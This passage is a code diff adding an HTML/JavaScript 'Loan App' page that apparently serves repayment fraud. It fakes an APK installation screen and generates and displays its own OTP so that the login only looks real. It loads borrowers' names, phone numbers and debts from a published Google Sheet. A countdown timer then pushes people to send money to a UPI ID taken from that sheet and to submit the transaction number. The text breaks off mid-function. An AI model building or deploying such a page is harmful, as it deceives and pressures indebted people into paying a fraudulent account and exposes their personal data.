@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+<html lang="EN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1565C0">
+    <title>Loan Application</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f5f5f5;
+        }
+
+        body {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .app-container {
+            width: 100vw;
+            height: 100vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            padding-bottom: 80px;
+        }
+
+        .screen {
+            display: none;
+            min-height: calc(100vh - 80px);
+            padding: 20px;
+            background: white;
+            position: relative;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: all 0.3s;
+        }
+
+        .back-button:active {
+            transform: scale(0.9);
+            background: #f5f5f5;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top: 2px solid #e0e0e0;
+            display: none;
+            grid-template-columns: 1fr 1fr 1fr;
+            padding: 10px 0;
+            z-index: 1000;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+        }
+
+        .bottom-nav.active {
+            display: grid;
+        }
+
+        .nav-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            gap: 5px;
+            border: none;
+            background: transparent;
+            color: #999;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+
+        .nav-btn.active-tab {
+            color: #1565C0;
+        }
+
+        .nav-btn:active {
+            background: #f0f0f0;
+        }
+
+        .nav-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .nav-btn:disabled:active {
+            background: transparent;
+        }
+
+        .nav-icon {
+            font-size: 24px;
+        }
+
+        .nav-label {
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .install-screen {
+            background: linear-gradient(135deg, #1565C0 0%, #0D47A1 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 40px;
+            min-height: 100vh;
+        }
+
+        .install-icon {
+            width: 120px;
+            height: 120px;
+            background: white;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .install-icon svg {
+            width: 70px;
+            height: 70px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .install-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .install-subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 40px;
+        }
+
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            height: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: white;
+            border-radius: 20px;
+            width: 0%;
+            animation: progress 8s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .install-status {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-bottom: 20px;
+        }
+
+        .install-button {
+            display: none;
+            padding: 14px 40px;
+            background: white;
+            color: #1565C0;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: all 0.3s;
+        }
+
+        .install-button.show {
+            display: inline-block;
+        }
+
+        .install-button:active {
+            transform: scale(0.95);
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1565C0;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background: #4CAF50;
+            color: white;
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
+        }
+
+        .btn-blue {
+            background: #2196F3;
+            color: white;
+            box-shadow: 0 4px 12px rgba(33, 150, 243, 0.3);
+        }
+
+        .btn-white {
+            background: white;
+            color: #1565C0;
+            border: 2px solid white;
+            font-size: 14px;
+            padding: 10px 20px;
+            width: auto;
+        }
+
+        .btn-small {
+            padding: 12px 16px;
+            font-size: 14px;
+        }
+
+        .loan-header-box {
+            background: linear-gradient(135deg, #1565C0 0%, #1976D2 100%);
+            padding: 24px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: white;
+            box-shadow: 0 4px 20px rgba(21, 101, 192, 0.3);
+        }
+
+        .loan-header-left h2 {
+            font-size: 14px;
+            font-weight: normal;
+            margin-bottom: 8px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .loan-header-left .amount {
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .notice {
+            background: #fff3cd;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+        }
+
+        .notice .dot {
+            width: 10px;
+            height: 10px;
+            background: red;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .feature-list {
+            margin-bottom: 20px;
+        }
+
+        .feature-box {
+            padding: 16px;
+            border: 2px solid #f0f0f0;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: white;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            flex-shrink: 0;
+        }
+
+        .feature-content {
+            flex: 1;
+        }
+
+        .feature-content strong {
+            display: block;
+            margin-bottom: 4px;
+            font-size: 15px;
+        }
+
+        .feature-content div {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .feature-box.green { border-left: 4px solid #4CAF50; }
+        .feature-box.blue { border-left: 4px solid #2196F3; }
+        .feature-box.orange { border-left: 4px solid #FF9800; }
+        .feature-box.purple { border-left: 4px solid #9C27B0; }
+
+        .loan-card {
+            border: 2px solid #FF9800;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: white;
+            box-shadow: 0 4px 12px rgba(255, 152, 0, 0.2);
+        }
+
+        .loan-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .icon-circle {
+            width: 50px;
+            height: 50px;
+            background: #FF9800;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .status-badge {
+            background: #FF9800;
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .status-badge.overdue {
+            background: #f44336;
+        }
+
+        .loan-details {
+            margin-top: 12px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .detail-value {
+            font-weight: 600;
+            font-size: 14px;
+            text-align: right;
+        }
+
+        .detail-value.overdue {
+            color: #f44336;
+        }
+
+        .payment-info-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+            padding: 14px;
+            background: #f9f9f9;
+            border-radius: 12px;
+        }
+
+        .payment-info-row label {
+            font-weight: 600;
+            min-width: 80px;
+            margin-bottom: 0;
+            font-size: 14px;
+        }
+
+        .payment-info-row input {
+            flex: 1;
+            padding: 10px;
+            margin: 0;
+            border: none;
+            background: transparent;
+            font-size: 14px;
+        }
+
+        .payment-info-row button {
+            padding: 10px 16px;
+            font-size: 13px;
+            width: auto;
+        }
+
+        .timer {
+            background: linear-gradient(135deg, #ff5252 0%, #f44336 100%);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(244, 67, 54, 0.3);
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .payment-method {
+            border: 2px solid #e0e0e0;
+            padding: 20px 15px;
+            border-radius: 12px;
+            text-align: center;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100px;
+            transition: all 0.3s;
+        }
+
+        .payment-method:active {
+            transform: scale(0.95);
+            border-color: #1565C0;
+        }
+
+        .payment-method img {
+            max-width: 100%;
+            max-height: 50px;
+            object-fit: contain;
+            margin-bottom: 8px;
+        }
+
+        .payment-method svg {
+            margin-bottom: 8px;
+        }
+
+        .payment-method-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .notice-box {
+            background: #e3f2fd;
+            padding: 16px;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+
+        .notice-box h3 {
+            margin-bottom: 12px;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .notice-box ol {
+            margin-left: 20px;
+        }
+
+        .notice-box li {
+            margin-bottom: 8px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2196F3;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .error-message {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+
+        .success-message {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+
+        .otp-hint {
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            text-align: center;
+            font-weight: 600;
+            color: #2e7d32;
+            font-size: 24px;
+            box-shadow: 0 4px 12px rgba(46, 125, 50, 0.2);
+        }
+
+        .content-with-back {
+            padding-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        
+        <!-- Screen 0: Installing APK -->
+        <div class="screen install-screen active" id="screen-install">
+            <div class="install-icon">
+                <svg viewBox="0 0 24 24" fill="#1565C0">
+                    <path d="M9 7h6v2H9V7zm0 4h6v2H9v-2z"/>
+                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
+                    <path d="M12 16l-4-4h8l-4 4z"/>
+                </svg>
+            </div>
+            <div class="install-title">Installing Loan App</div>
+            <div class="install-subtitle">Please wait while we set up your app...</div>
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+            <div class="install-status" id="install-status">Installing... 0%</div>
+            <button class="install-button" id="install-button" onclick="goToLogin()">Go to Login Page</button>
+        </div>
+
+        <!-- Screen 1: Registration/OTP -->
+        <div class="screen" id="screen-registration">
+            <h1>💰 Loan App</h1>
+            
+            <div id="phone-section">
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Enter mobile number" value="+91 ">
+                </div>
+                <button class="btn-primary" onclick="sendOTP()">Send OTP</button>
+            </div>
+            
+            <div id="otp-section" style="display: none; margin-top: 20px;">
+                <div class="success-message">
+                    ✅ OTP sent successfully!
+                </div>
+                <div class="otp-hint">
+                    📱 <span id="otp-display">----</span>
+                </div>
+                <div class="input-group">
+                    <label>Enter OTP</label>
+                    <input type="text" id="otp" placeholder="Enter 4-digit OTP" maxlength="4">
+                </div>
+                <button class="btn-primary" onclick="verifyOTP()">Verify OTP</button>
+            </div>
+            
+            <div id="error-message" class="error-message" style="display: none;"></div>
+        </div>
+
+        <!-- Loading Screen -->
+        <div class="screen" id="screen-loading">
+            <div class="loading">
+                <div class="spinner"></div>
+                <h2>Loading...</h2>
+            </div>
+        </div>
+
+        <!-- Screen 2: Home -->
+        <div class="screen" id="screen-home">
+            <div class="back-button" onclick="goBackFromHome()">←</div>
+            
+            <div class="content-with-back">
+                <div class="loan-header-box">
+                    <div class="loan-header-left">
+                        <h2>Loan amount up to</h2>
+                        <div class="amount">INR ₹50,000</div>
+                    </div>
+                    <button class="btn-white" disabled>Apply Now</button>
+                </div>
+                
+                <div class="notice">
+                    <span class="dot"></span>
+                    <span>Unsuccessful loan application will not incur any fees</span>
+                </div>
+
+                <div class="feature-list">
+                    <div class="feature-box green">
+                        <div class="feature-icon">💚</div>
+                        <div class="feature-content">
+                            <strong>Loan Amount</strong>
+                            <div>INR 2,600 to INR 50,000</div>
+                        </div>
+                    </div>
+                    
+                    <div class="feature-box blue">
+                        <div class="feature-icon">📅</div>
+                        <div class="feature-content">
+                            <strong>Tenure</strong>
+                            <div>7 days - 30 days</div>
+                        </div>
+                    </div>
+                    
+                    <div class="feature-box orange">
+                        <div class="feature-icon">🧮</div>
+                        <div class="feature-content">
+                            <strong>Low Interest</strong>
+                            <div>Low as 0%</div>
+                        </div>
+                    </div>
+                    
+                    <div class="feature-box purple">
+                        <div class="feature-icon">⚡</div>
+                        <div class="feature-content">
+                            <strong>24 x 7 Access</strong>
+                            <div>to loans</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 3: My Account -->
+        <div class="screen" id="screen-pending">
+            <div class="back-button" onclick="goBackFromPending()">←</div>
+            
+            <div class="content-with-back">
+                <h1>My Account</h1>
+                
+                <div class="loan-card">
+                    <div class="loan-header">
+                        <div class="icon-circle">💰</div>
+                        <div class="status-badge" id="pending-status-badge">Pending Repayment</div>
+                    </div>
+                    
+                    <div class="loan-details">
+                        <div class="detail-row">
+                            <span class="detail-label">Repayment Amount</span>
+                            <span class="detail-value">₹<span id="pending-repayment-amount">5000</span></span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Order No</span>
+                            <span class="detail-value" id="pending-order-no">LD000000</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Due Date</span>
+                            <span class="detail-value" id="pending-due-date">10/01/2025</span>
+                        </div>
+                        <div class="detail-row" id="pending-overdue-row" style="display: none;">
+                            <span class="detail-label">Overdue Days</span>
+                            <span class="detail-value overdue" id="pending-overdue-days">0</span>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-blue" onclick="showDetailsScreen()" style="margin-top: 20px;">Repay</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 4: Order Details -->
+        <div class="screen" id="screen-details">
+            <div class="back-button" onclick="goBack()">←</div>
+            
+            <div class="content-with-back">
+                <h1>Order Details</h1>
+                
+                <div class="section-header">
+                    <span>🪙</span>
+                    <span style="color: #FF9800;">Pending Repayment</span>
+                </div>
+                
+                <div class="loan-details" style="background: #f9f9f9; padding: 16px; border-radius: 12px; margin-bottom: 20px;">
+                    <div class="detail-row">
+                        <span class="detail-label">Total Repayment Amount</span>
+                        <span class="detail-value" style="color: #FF5252;">₹<span id="detail-repayment-amount">5000</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Due Date</span>
+                        <span class="detail-value" id="detail-due-date">10/01/2025</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Loan Amount</span>
+                        <span class="detail-value">₹<span id="detail-loan-amount">5000</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Late Fee</span>
+                        <span class="detail-value overdue">₹<span id="detail-late-fee">0</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Tenure</span>
+                        <span class="detail-value"><span id="detail-tenure">7</span> days</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Application Date</span>
+                        <span class="detail-value" id="detail-app-date">03/01/2025</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Name</span>
+                        <span class="detail-value" id="detail-name">John Doe</span>
+                    </div>
+                    <div class="detail-row" id="detail-overdue-row" style="display: none;">
+                        <span class="detail-label">Overdue Days</span>
+                        <span class="detail-value overdue" id="detail-overdue-days">0</span>
+                    </div>
+                </div>
+
+                <button class="btn-blue" onclick="navigateToTab('payment')">Repay</button>
+            </div>
+        </div>
+
+        <!-- Screen 5: Payment -->
+        <div class="screen" id="screen-payment">
+            <div class="back-button" onclick="goBackFromPayment()">←</div>
+            
+            <div class="content-with-back">
+                <h1>Payment</h1>
+                
+                <div class="timer" id="timer">
+                    Order closes in <span id="countdown">5:00</span>
+                </div>
+
+                <div class="payment-info-row">
+                    <label>Amount</label>
+                    <input type="text" id="amount" value="5000" readonly>
+                    <button class="copy-btn btn-blue btn-small" onclick="copyText('amount')">Copy</button>
+                </div>
+
+                <div class="payment-info-row">
+                    <label>VPA/UPI</label>
+                    <input type="text" id="upi" value="merchant@upi" readonly>
+                    <button class="copy-btn btn-blue btn-small" onclick="copyText('upi')">Copy</button>
+                </div>
+
+                <h3 style="margin: 20px 0 12px 0; font-size: 16px; font-weight: 600;">Transfer Money Via</h3>
+                <div class="payment-methods">
+                    <div class="payment-method">
+                        <svg width="60" height="60" viewBox="0 0 100 100">
+                            <defs>
+                                <linearGradient id="phonePeGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                    <stop offset="0%" style="stop-color:#5f259f;stop-opacity:1" />
+                                    <stop offset="100%" style="stop-color:#7b3fb2;stop-opacity:1" />
+                                </linearGradient>
+                            </defs>
+                            <circle cx="50" cy="50" r="45" fill="url(#phonePeGrad)"/>
+                            <text x="50" y="68" text-anchor="middle" fill="white" font-size="32" font-weight="bold" font-family="'Trebuchet MS', Arial, sans-serif" letter-spacing="1">Pe</text>
+                        </svg>
+                        <div class="payment-method-name">PhonePe</div>
+                    </div>
+                    
+                    <div class="payment-method">
+                        <svg width="60" height="60" viewBox="0 0 100 100">
+                            <defs>
+                                <linearGradient id="paytmGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                    <stop offset="0%" style="stop-color:#00BAF2;stop-opacity:1" />
+                                    <stop offset="100%" style="stop-color:#002E6E;stop-opacity:1" />
+                                </linearGradient>
+                            </defs>
+                            <circle cx="50" cy="50" r="45" fill="url(#paytmGrad)"/>
+                            <rect x="25" y="30" width="8" height="40" fill="white" rx="2"/>
+                            <path d="M 38 30 Q 56 30 56 44 Q 56 58 38 58 L 38 52 Q 50 52 50 44 Q 50 36 38 36 Z" fill="white"/>
+                        </svg>
+                        <div class="payment-method-name">Paytm</div>
+                    </div>
+                    
+                    <div class="payment-method">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay">
+                        <div class="payment-method-name">Google Pay</div>
+                    </div>
+                    
+                    <div class="payment-method">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI">
+                        <div class="payment-method-name">UPI</div>
+                    </div>
+                </div>
+
+                <p style="margin: 20px 0 12px 0; font-weight: 600; font-size: 14px;">Enter UTR after payment</p>
+                <div class="input-group">
+                    <label>UTR Number (12 digits only)</label>
+                    <input type="text" id="utr" placeholder="Enter 12-digit UTR Number" maxlength="12" inputmode="numeric" oninput="validateUTR(this)">
+                </div>
+                <div id="utr-error" class="error-message" style="display: none;"></div>
+
+                <button class="btn-primary" onclick="submitUTR()">Submit UTR</button>
+
+                <div class="notice-box">
+                    <h3>⚠️ Important Notice</h3>
+                    <ol>
+                        <li>One UPI can only transfer money once</li>
+                        <li>Don't change the payment amount otherwise the order cannot be closed</li>
+                        <li>UTR number must be exactly 12 digits</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- Success Screen -->
+        <div class="screen" id="screen-success">
+            <div class="back-button" onclick="navigateToTab('home')">←</div>
+            
+            <div class="loading content-with-back">
+                <div style="font-size: 80px; margin-bottom: 20px;">✅</div>
+                <h2>Payment Submitted!</h2>
+                <p style="margin-top: 20px; color: #666;">Your payment is being processed.</p>
+                <button class="btn-primary" onclick="navigateToTab('home')" style="margin-top: 40px;">Back to Home</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Bottom Navigation Bar -->
+    <div class="bottom-nav" id="bottom-nav">
+        <button class="nav-btn" id="nav-home" onclick="navigateToTab('home')" disabled>
+            <div class="nav-icon">🏠</div>
+            <div class="nav-label">Home</div>
+        </button>
+        <button class="nav-btn" id="nav-pending" onclick="navigateToTab('pending')" disabled>
+            <div class="nav-icon">👤</div>
+            <div class="nav-label">My Account</div>
+        </button>
+        <button class="nav-btn active-tab" id="nav-payment" onclick="navigateToTab('repay')">
+            <div class="nav-icon">💳</div>
+            <div class="nav-label">Repay</div>
+        </button>
+    </div>
+
+    <script>
+        let countdownInterval;
+        let currentUserData = null;
+        let generatedOTP = '';
+        let SHEET_DATA = {}; // Will store fetched data
+
+        // 🔥 GOOGLE SHEETS CSV URL
+        const CSV_URL = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vSqEJvs5Tnz2x1oCo5xOURlss-qdpBeF8Ew2-7wllFw17LU_jaxJ0YF-Gw8ncqUpAru6LfK25HlL__U/pub?gid=0&single=true&output=csv';
+
+        // 🔥 FETCH DATA FROM GOOGLE SHEETS
+        async function fetchGoogleSheetData() {
+            try {
+                console.log('🔄 Fetching data from Google Sheets...');
+                const response = await fetch(CSV_URL);
+                const csvText = await response.text();
+                console.log('✅ CSV Data fetched successfully');
+                return parseCSV(csvText);
+            } catch (error) {
+                console.error('❌ Error fetching Google Sheet:', error);
+                return null;
+            }
+        }
+
+        // 🔥 PARSE CSV DATA
+        function parseCSV(csvText) {
+            const lines = csvText.split('\n');
+            const headers = parseCSVLine(lines[0]);
+            const data = {};
+            
+            console.log('📋 CSV Headers:', headers);
+            
+            for (let i = 1; i < lines.length; i++) {
+                if (!lines[i].trim()) continue;
+                
+                const values = parseCSVLine(lines[i]);
+                const row = {};
+                
+                headers.forEach((header, index) => {
+                    row[header] = values[index] || '';
+                });
+                
+                // Use mobile number as key (extract last 10 digits)
+                const mobile = row['Mobile']?.replace(/\D/g, '').slice(-10);
+                if (mobile) {
+                    data[mobile] = row;
+                    console.log('✅ Added record for mobile:', mobile);
+                }
+            }
+            
+            console.log('📊 Total records loaded:', Object.keys(data).length);
+            return data;
+        }
+
+        // 🔥 PARSE CSV LINE (handles commas in quotes)
+        function parseCSVLine(line) {
+            const result = [];
+            let current = '';
+            let inQuotes = false;
+            
+            for (let i = 0; i < line.length; i++) {
+                const char = line[i];
+                
+                if (char === '"') {
+                    inQuotes = !inQuotes;
+                } else if (char === ',' && !inQuotes) {
+                    result.push(current.trim());
+                    current = '';
+                } else {
+                    current += char;
+                }
+            }
+            result.push(current.trim());
+            return result;
+        }
+
+        window.addEventListener('load', () => {
+            simulateInstallation();
+            // Fetch data on load
+            fetchGoogleSheetData().then(data => {
+                if (data) {
+                    SHEET_DATA = data;
+                    console.log('✅ Sheet data loaded and ready!');
+                }
+            });
+        });
+
+        function simulateInstallation() {
+            const statusEl = document.getElementById('install-status');
+            const buttonEl = document.getElementById('install-button');
+            let progress = 0;
+            
+            const interval = setInterval(() => {
+                progress += 1.25;
+                statusEl.textContent = `Installing... ${Math.floor(progress)}%`;
+            }, 100);
+            
+            setTimeout(() => {
+                clearInterval(interval);
+                statusEl.textContent = 'Installation Complete!';
+                buttonEl.classList.add('show');
+                
+                setTimeout(() => {
+                    goToLogin();
+                }, 2000);
+            }, 8000);
+        }
+
+        function goToLogin() {
+            const installScreen = document.getElementById('screen-install');
+            installScreen.style.display = 'none';
+            installScreen.classList.remove('active');
+            
+            const registrationScreen = document.getElementById('screen-registration');
+            registrationScreen.style.display = 'block';
+            registrationScreen.classList.add('active');
+        }
+
+        function validateUTR(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            const errorDiv = document.getElementById('utr-error');
+            if (input.value.length > 0 && input.value.length !== 12) {
+                errorDiv.textContent = '⚠️ UTR must be exactly 12 digits';
+                errorDiv.style.display = 'block';
+            } else {
+                errorDiv.style.display = 'none';
+            }
+        }
+
+        // 🔥 SEND OTP - SEARCHES IN GOOGLE SHEET DATA (WITH RANDOM OTP)
+        async function sendOTP() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.style.display = 'none';
+            
+            const phoneDigits = phoneInput.replace(/\D/g, '');
+            
+            if (phoneDigits.length < 10) {
+                errorDiv.textContent = '❌ Please enter a valid 10-digit mobile number';
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            const searchPhone = phoneDigits.slice(-10);
+            console.log('🔍 Searching for mobile:', searchPhone);
+            
+            // If data not loaded yet, fetch it now
+            if (Object.keys(SHEET_DATA).length === 0) {
+                errorDiv.textContent = '⏳ Loading data, please wait...';
+                errorDiv.style.display = 'block';
+                
+                const data = await fetchGoogleSheetData();
+                if (data) {
+                    SHEET_DATA = data;
+                    errorDiv.style.display = 'none';
+                } else {
+                    errorDiv.textContent = '❌ Error loading data. Please refresh the page.';
+                    errorDiv.style.display = 'block';
+                    return;
+                }
+            }
+            
+            // Search in Google Sheet data
+            if (SHEET_DATA[searchPhone]) {
+                currentUserData = SHEET_DATA[searchPhone];
+                // 🔥 GENERATE RANDOM 4-DIGIT OTP
+                generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
+                console.log('✅ FOUND IN GOOGLE SHEET:', currentUserData);
+                console.log('🔐 Generated OTP:', generatedOTP);
+                
+                document.getElementById('otp-section').style.display = 'block';
+                document.getElementById('otp-display').textContent = generatedOTP;
+                document.getElementById('phone-section').style.display = 'none';
+            } else {
+                errorDiv.textContent = '❌ Mobile number not found in records.';
+                errorDiv.style.display = 'block';
+                console.log('❌ Available numbers:', Object.keys(SHEET_DATA).join(', '));
+            }
+        }
+
+        function verifyOTP() {
+            const otp = document.getElementById('otp').value.trim();
+            const errorDiv = document.getElementById('error-message');
+            
+            if (otp === generatedOTP) {
+                errorDiv.style.display = 'none';
+                
+                const registrationScreen = document.getElementById('screen-registration');
+                registrationScreen.style.display = 'none';
+                registrationScreen.classList.remove('active');
+                
+                populateUserData();
+                showScreenWithNav('screen-home');
+            } else {
+                errorDiv.textContent = '❌ Invalid OTP. Please try again.';
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // 🔥 POPULATE USER DATA FROM GOOGLE SHEET
+        function populateUserData() {
+            if (!currentUserData) return;
+            
+            const clean = (val) => (val || '').toString().replace(/,/g, '').replace(/"/g, '').trim();
+            
+            // 🔥 Map Google Sheet columns to fields - USING VPA/UPI FROM COLUMN Q
+            const totalRepayment = clean(currentUserData['Total repayment amount']);
+            const loanAmount = clean(currentUserData['Loan Amount']);
+            const lateFee = clean(currentUserData['Late Fee']);
+            const dueDate = clean(currentUserData['Due Date']);
+            const daysOverdue = clean(currentUserData['Days overdue']);
+            const applicationDate = clean(currentUserData['Application date']);
+            const tenure = clean(currentUserData['tenure']);
+            const vpaUpi = clean(currentUserData['VPA/UPI']);  // 🔥 PULLING FROM VPA/UPI COLUMN (Q)
+            const name = clean(currentUserData['Name']);
+            const mobile = clean(currentUserData['Mobile']);
+            
+            console.log('📝 Populating data:', {
+                totalRepayment, loanAmount, lateFee, dueDate, daysOverdue, 
+                applicationDate, tenure, vpaUpi, name, mobile
+            });
+            
+            const orderNo = `LD${mobile.slice(-6)}`;
+            const isOverdue = parseInt(daysOverdue) > 0;
+
+            // My Account Screen
+            document.getElementById('pending-repayment-amount').textContent = totalRepayment;
+            document.getElementById('pending-order-no').textContent = orderNo;
+            document.getElementById('pending-due-date').textContent = dueDate;
+            
+            if (isOverdue) {
+                document.getElementById('pending-overdue-days').textContent = daysOverdue + ' days';
+                document.getElementById('pending-overdue-row').style.display = 'flex';
+                document.getElementById('pending-status-badge').textContent = 'Overdue';
